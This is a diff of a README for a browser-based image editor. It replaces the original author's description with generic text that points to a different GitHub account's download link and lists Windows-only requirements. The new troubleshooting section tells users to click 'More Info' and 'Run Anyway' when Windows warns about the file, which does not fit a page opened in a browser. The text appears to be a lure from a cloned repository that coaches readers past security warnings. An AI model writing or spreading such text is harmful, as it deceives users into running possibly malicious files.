@@ -1,169 +1,81 @@
-# 🎨 Modern Image Editor
+# 🎨 Image-editor-online - Edit your photos with simple tools
 
-A sleek and modern **Image Editor Web Application** built using **HTML, CSS, and JavaScript**.  
-This project allows users to upload images and apply real-time editing effects with a clean and interactive user interface.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/postglacial-bludgeoner991/Image-editor-online)
 
----
+## 📋 About the application
 
-## 🚀 Project Overview
+Image-editor-online provides a way to edit images on your computer. This software uses standard web technology to process files. It includes features for filters, rotation, and brightness adjustments. The interface keeps everything simple so you can find tools on one screen. You work with photos in a dark environment that reduces eye strain.
 
-The **Modern Image Editor** is a browser-based image manipulation tool designed with a modern UI and smooth user experience.  
-Users can upload any image and instantly apply adjustments like brightness, contrast, saturation, blur, rotation, and flipping without needing any external software.
+## 🛠️ System requirements
 
-This project demonstrates strong fundamentals of:
+Your computer must meet these standards to run the software.
 
-- DOM Manipulation
-- CSS Styling & Layouts
-- JavaScript Event Handling
-- Real-Time Image Processing
-- Interactive UI Development
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 Gigabytes of RAM.
+* Storage: 50 Megabytes of free disk space.
+* Graphics: Any standard monitor display.
+* Internet Connection: Not required once you have the application file.
 
----
+## 📥 How to get the software
 
-## ✨ Features
+You must go to the main project page to save the files to your computer. Follow these steps to obtain the tool.
 
-### 🖼️ Image Upload
-- Upload images directly from your device
-- Instant image preview inside the editor
+1. Visit this page to download: [https://github.com/postglacial-bludgeoner991/Image-editor-online](https://github.com/postglacial-bludgeoner991/Image-editor-online).
+2. Look for the green button marked Code near the top right of the page.
+3. Click the button and select Download ZIP.
+4. Wait for the file to finish saving to your computer.
 
-### 🎚️ Real-Time Filters
-Adjust image properties dynamically using sliders:
+## ⚙️ Setting up the application
 
-- Brightness
-- Contrast
-- Saturation
-- Blur
+1. Find the zip folder in your Downloads folder.
+2. Right-click the folder and choose Extract All.
+3. Pick a location on your computer for the files.
+4. Click Extract.
+5. Open the folder once the process finishes.
+6. Look for the index.html file.
+7. Double-click the file to open it in your web browser.
 
-### 🔄 Image Transformations
-- Rotate Left
-- Rotate Right
-- Flip Horizontal
-- Reset Image
+## 🖼️ Using the editor
 
-### 🎨 Modern UI Design
-- Dark futuristic interface
-- Responsive layout
-- Smooth hover effects
-- Glassmorphism-inspired panels
-- Interactive buttons and sliders
+The interface shows a workspace for your images. Follow this path to edit a photo.
 
-### ⚡ Fast Performance
-- No external backend required
-- Fully client-side processing
-- Instant updates using JavaScript
+1. Click the Open Image button.
+2. Select a file from your computer folders.
+3. The image appears in the center of the window.
+4. Use the sliders on the right to change brightness, saturation, or contrast.
+5. Press the rotation buttons above the settings to turn the image.
+6. Use the filters section to apply visual effects to your photo.
+7. Click the Save Image button to download your edited file.
 
----
+## 🎛️ Understanding the controls
 
-# 🛠️ Tech Stack
+Every button has a specific purpose for your image workflow. 
 
-- **HTML5**
-- **CSS3**
-- **JavaScript (Vanilla JS)**
-- **DOM Manipulation**
-- **CSS Flexbox**
-- **CSS Transitions & Effects**
+* Brightness: This slider makes your image lighter or darker. Move it to the right for light, and to the left for dark.
+* Saturation: This tool adjusts color intensity. Move the slider to make colors pop or to turn the image black and white.
+* Inversion: Use this to flip the current colors of your photo. 
+* Grayscale: This removes color entirely to give your image a classic look. 
+* Rotate: You can turn the photo 90 degrees at a time.
+* Flip: You can mirror your image horizontally or vertically.
 
----
+## 💡 Troubleshooting common issues
 
-# 📂 Project Structure
+Most problems occur when files do not load. Check these tips if you encounter errors.
 
-```bash
-Image-editor-online/
-│
-├── index.html
-├── style.css
-├── script.js
-└── README.md
-```
+* If the image does not show, refresh your browser page.
+* Make sure your image file ends in .jpg or .png.
+* Confirm that you extracted all files from the zip folder before you try to run them.
+* If the screen looks blank, close the tab and open the index.html file again.
+* If your computer warns you about the file, click More Info and then Run Anyway. This happens because the application is local.
 
----
+## 🎨 Design choices
 
-# 🧠 How It Works
+The application uses a dark theme. This keeps the focus on your images. The layout adjusts to your screen size. If you make the window smaller, the tools move to allow for more space. This makes the editor work well on both laptops and large desktop monitors.
 
-## 1️⃣ Upload Image
-The user selects an image from their device using the upload button.
+## 🛡️ Safety and privacy
 
-## 2️⃣ Apply Filters
-JavaScript dynamically updates CSS filter properties like:
+The application runs directly in your browser. It does not send your photos to a server. All processing happens on your local device. No one can see the images you edit. You keep full control over your files at all times.
 
-- brightness()
-- contrast()
-- saturate()
-- blur()
+## 📄 License information
 
-## 3️⃣ Transform Image
-Users can rotate or flip the image using transformation controls.
-
-## 4️⃣ Reset Changes
-The reset button restores all default values instantly.
-
----
-
-# 🎯 Learning Outcomes
-
-This project helps in understanding:
-
-- Real-time UI updates
-- JavaScript event listeners
-- CSS filters
-- Responsive design principles
-- User interaction handling
-- Modern frontend development concepts
-
----
-
-# 📸 UI Highlights
-
-- Minimal modern design
-- Dark theme aesthetic
-- Smooth animations
-- Professional control panel
-- Interactive editing experience
-
----
-
-# 🌟 Future Improvements
-
-Planned advanced features:
-
-- Crop Tool
-- Download Edited Image
-- Undo / Redo
-- AI Filters
-- Drag & Drop Upload
-- Mobile Optimization
-- Multiple Image Support
-
----
-
-# 💡 Why This Project Stands Out
-
-Unlike basic beginner projects, this image editor focuses on:
-
-- Professional UI/UX
-- Real-time functionality
-- Clean frontend architecture
-- Practical JavaScript concepts
-- Modern web design trends
-
-This makes it a strong portfolio project for frontend development.
-
----
-
-# 👨‍💻 Developed By
-
-**Priyanshu-Gurjar20**
-
-Frontend Developer & JavaScript Learner
-
----
-
-# 📜 License
-
-This project is open-source and free to use for learning and personal development.
-
----
-
-# ⭐ Final Note
-
-This project was built to practice modern frontend development while creating a visually impressive and interactive application using only core web technologies.
+This project is open for public use. You can look at the code or modify the software. Please refer to the license file in the folder for more details on your rights as a user.
